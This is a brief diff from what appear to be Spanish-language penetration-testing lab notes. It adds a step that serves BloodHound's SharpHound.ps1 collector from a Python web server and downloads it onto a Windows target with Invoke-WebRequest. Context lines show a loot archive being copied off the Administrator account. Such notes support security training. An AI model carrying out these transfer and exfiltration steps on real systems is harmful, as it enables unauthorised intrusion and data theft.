@@ -134,6 +134,6 @@ pscp Administrator@10.129.147.125:/Users/Administrator/20260420084015_loot.zip .
 
 - Nos lo descargaremos con `wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1`
 
-
-
+- Lo transferiremos a la maquina windows a traves de un servidor de python y en la maquina windows con `Invoke-WebRequest http://192.168.155.194:8000/SharpHound.ps1 -OutFile SharpHound.ps1`
 ```
+
